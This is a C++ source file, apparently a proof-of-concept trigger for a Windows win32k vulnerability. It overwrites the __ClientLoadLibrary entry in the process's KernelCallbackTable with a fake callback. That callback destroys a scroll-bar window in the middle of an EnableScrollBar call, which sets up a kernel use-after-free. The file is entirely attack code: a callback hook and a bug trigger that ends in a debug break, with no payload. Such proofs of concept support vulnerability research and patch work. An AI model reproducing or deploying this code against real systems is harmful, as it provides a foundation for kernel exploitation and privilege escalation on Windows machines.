#include "header.h"

const char szClassName[] = "Thunder_J";
HWND hwnd = NULL;
ULONG_PTR _ClientLoadLibrary_addr;
fct_clLoadLib _ClientLoadLibrary;
int hookflag = 0;
int hookcount = 0;

VOID Fake_ClientLoadLibrary()
{
	if (hookflag)
	{
		if (++hookcount == 2)
		{
			hookflag = 0;
			DestroyWindow(hwnd);
		}
	}
}

ULONG_PTR Get_ClientLoadLibrary()
{
	return (ULONG_PTR) * (ULONG_PTR*)(__readgsqword(0x60) + 0x58) + 0x238; // 首先获取PEB,然后根据偏移找到KernelCallbackTable,最后找到__ClientLoadLibrary
}

BOOL Hook__ClientLoadLibrary()
{
	DWORD dwOldProtect;
	
	cout << "[+] ClientLoadLibray address is : 0x" << hex << Get_ClientLoadLibrary() << endl;
	_ClientLoadLibrary_addr = Get_ClientLoadLibrary();
	_ClientLoadLibrary = (fct_clLoadLib) * (ULONG_PTR*)_ClientLoadLibrary_addr; //存一份地址
	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
	{
		cout << "[*] Alloc ClientLoadLibrary address failed!!!\n" << endl;
		system("pause");
		return FALSE;
	}

	*(ULONG_PTR*)_ClientLoadLibrary_addr = (ULONG_PTR)Fake_ClientLoadLibrary;
	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
	{
		cout << "[*] Set ClientLoadLibrary address failed!!!\n" << endl;
		system("pause");
		return FALSE;
	}
	return TRUE;
}

BOOL Poc()
{
	cout << "[+] Start to create window";

	WNDCLASSEXA wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DefWindowProcA;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))
	{
		cout << "\n[*] Failed to register window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	hwnd = CreateWindowExA(
		0,
		szClassName,
		0,
		SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
		10,
		10,
		100,
		100,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (!hwnd)
	{
		cout << "\n[*] Failed to create window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);

	cout << " => done" << endl;
	hookflag = 1;

	__debugbreak();
	EnableScrollBar(
		hwnd,
		SB_CTL | SB_BOTH, // wSBflags 指定滚动条类型,设置为3
		ESB_DISABLE_BOTH  // wArrows  指定是否启用或禁用滚动条箭头,并指示启用或禁用哪些箭头,设置为3
	);

	return TRUE;
}

int main(int argc,char* argv[])
{
	if (!Hook__ClientLoadLibrary())
	{
		cout << "[*] Step one failed!\n[*] Error code is :" << GetLastError() << endl;
		system("pause");
		return 1;
	}

	if (!Poc())
	{
		cout << "[*] Step two failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	system("pause");
	return 0;
}